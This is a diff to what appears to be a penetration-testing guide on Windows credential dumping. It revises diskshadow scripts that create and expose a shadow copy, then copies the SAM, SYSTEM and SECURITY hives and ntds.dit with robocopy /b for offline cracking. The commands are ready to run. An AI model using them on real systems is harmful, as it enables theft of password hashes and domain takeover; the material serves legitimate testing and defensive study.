@@ -256,18 +256,24 @@ The differences between tools are essentially in Step 1 and Step 2 - what endpoi
 SeBackupPrivilege allows a process to bypass normal file security checks when performing backup operations. In practice this means tools using backup semantics (like `robocopy /b`) can read files that would otherwise be inaccessible due to ACLs or OS locks. Note that SeBackupPrivilege alone doesn't grant the ability to create VSS snapshots - creating a shadow copy requires additional privileges or running as an administrator. The combination of SeBackupPrivilege and robocopy /b is useful for reading from an already-existing snapshot, or when elevated enough to create one.
 
 ```cmd
-:: Create the diskshadow script file
-echo set context persistent nowriters > shadow.txt
-echo add volume c: alias tk >> shadow.txt
+:: Create diskshadow script
+echo set verbose on > shadow.txt
+echo set metadata C:\Temp\meta.cab >> shadow.txt
+echo set context clientaccessible >> shadow.txt
+echo set context persistent >> shadow.txt
+echo begin backup >> shadow.txt
+echo add volume C: alias tk >> shadow.txt
 echo create >> shadow.txt
-echo expose %%tk%% z: >> shadow.txt
+echo expose %tk% Z: >> shadow.txt
+echo end backup >> shadow.txt
+echo exit >> shadow.txt
 
 :: Run the script
-diskshadow /s shadow.txt
+diskshadow.exe /s shadow.txt
 
 :: Copy sensitive files from the snapshot
-robocopy /b z:\Windows\System32\Config C:\Temp SAM SYSTEM SECURITY
-robocopy /b z:\Windows\NTDS C:\Temp ntds.dit
+robocopy /b Z:\Windows\System32\Config C:\Temp SAM SYSTEM SECURITY
+robocopy /b Z:\Windows\NTDS C:\Temp ntds.dit
 ```
 
 Then transfer the files to the attacker machine and parse offline:
@@ -488,19 +494,25 @@ Before moving on, here's the difference between these three approaches - they so
 - You don't have SYSTEM but have `SeBackupPrivilege` only - for example through membership in Backup Operators. As SYSTEM you already have SeBackupPrivilege by default, so this method works either way. But if you only have SeBackupPrivilege without SYSTEM - VSS + `robocopy /b` is your path since you can't run arbitrary commands as SYSTEM
 
 ```cmd
-:: Create the diskshadow script file
-echo set context persistent nowriters > shadow.txt
-echo add volume c: alias snap >> shadow.txt
+:: Create diskshadow script
+echo set verbose on > shadow.txt
+echo set metadata C:\Temp\meta.cab >> shadow.txt
+echo set context clientaccessible >> shadow.txt
+echo set context persistent >> shadow.txt
+echo begin backup >> shadow.txt
+echo add volume C: alias snap >> shadow.txt
 echo create >> shadow.txt
-echo expose %%snap%% z: >> shadow.txt
+echo expose %snap% Z: >> shadow.txt
+echo end backup >> shadow.txt
+echo exit >> shadow.txt
 
-diskshadow /s shadow.txt
+diskshadow.exe /s shadow.txt
 
 :: Copy files from the shadow copy
-robocopy /b z:\Windows\System32\Config C:\Temp SAM SYSTEM SECURITY
+robocopy /b Z:\Windows\System32\Config C:\Temp SAM SYSTEM SECURITY
 
 :: NTDS.dit only exists on Domain Controllers - skip on terminal servers/workstations
-robocopy /b z:\Windows\NTDS C:\Temp ntds.dit
+robocopy /b Z:\Windows\NTDS C:\Temp ntds.dit
 ```
 
 Then transfer the files to the attacker machine and parse offline:
